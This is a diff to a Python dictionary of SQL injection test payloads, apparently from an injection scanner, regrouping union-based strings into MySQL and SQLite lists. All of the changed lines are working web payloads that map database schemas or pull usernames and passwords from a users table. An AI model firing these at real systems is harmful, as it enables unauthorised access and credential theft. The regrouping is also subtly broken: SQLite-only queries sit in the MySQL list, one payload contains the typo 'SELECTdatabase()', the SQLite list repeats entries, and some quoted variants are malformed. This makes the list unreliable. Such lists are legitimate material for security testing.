@@ -49,28 +49,14 @@ test_injections = {
 		"1 UNION SELECT NULL --",
 		"1 UNION SELECT NULL, NULL --",
 		"1 UNION SELECT NULL, NULL, NULL --",
-		"1 UNION SELECT NULL, database(), version() --",  # MySQL specific
-		"1 UNION SELECT NULL, sqlite_version(), NULL --",  # SQLite specific
-		"1 UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- ", # MySQL specific
-		"1 UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- ", # SQLite specific
 		"1 UNION SELECT NULL, CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns WHERE table_schema=database() -- ", # MySQL specific
-		"1 UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- ", # SQLite specific
 		"1 UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- ",
 		"1 UNION SELECT id, username, password FROM users -- ",
-		"1 UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- ", # MySQL specific
 		"1 'UNION SELECT NULL --'",
 		"1 'UNION SELECT NULL, NULL --'",
 		"1 'UNION SELECT NULL, NULL, NULL --'",
-		"1 'UNION SELECT NULL, database(), version() --'",  # MySQL specific
-		"1 'UNION SELECT NULL, sqlite_version(), NULL --'",  # SQLite specific
-		"1 'UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- '", # MySQL specific
-		"1 'UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- '", # SQLite specific
-		"1 'UNION SELECT NULL, CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns WHERE table_schema=database() -- '", # MySQL specific
-		"1 'UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- '", # SQLite specific
 		"1 'UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- '",
 		"1 'UNION SELECT id, username, password FROM users -- '",
-		"1 'UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- '", # MySQL specific
-		"1 'UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- '", # MySQL specific
 	],
 	"boolean": [
 		"'OR' 1=1",
@@ -80,5 +66,39 @@ test_injections = {
 		"1 OR 1=1#",
 		"' OR ' a'='a",
 		"' OR ' a=a"
-	]
+	],
+	"mysql": [
+		"1 UNION SELECT NULL, database(), version() --",
+		"1 'UNION SELECT NULL, database(), version() --'",
+		"1 UNION SELECT database(), version() --",
+		"1 'UNION SELECTdatabase(), version() --'",
+		"1 UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- ",
+		"1 'UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- '",
+		"1 UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- ",
+		"1 'UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- '",
+		"1 UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- ",
+		"1 'UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- '",
+		"1 UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- ",
+		"1 'UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- '",
+		"1 UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- ",
+		"1 'UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- '",
+		"1 UNION SELECT NULL, CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns WHERE table_schema=database() -- ",
+		"1 'UNION SELECT NULL, CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns WHERE table_schema=database() -- '",
+	],
+	"sqlite": [
+		"1 UNION SELECT NULL, sqlite_version(), NULL --",
+		"1 'UNION SELECT NULL, sqlite_version(), NULL --'",
+		"1 UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- ",
+		"1 'UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- '",
+		"1 UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- ",
+		"1 'UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- '",
+		"1 UNION SELECT sql, NULL, NULL FROM sqlite_master WHERE type='table' -- ",
+		"1 'UNION SELECT sql, NULL, NULL FROM sqlite_master WHERE type='table' -- '",
+		"1 UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- ",
+		"1 'UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- '",
+		"1 UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- ",
+		"1 'UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- '",
+		"1 UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- ",
+		"1 'UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- '",
+	],
 }
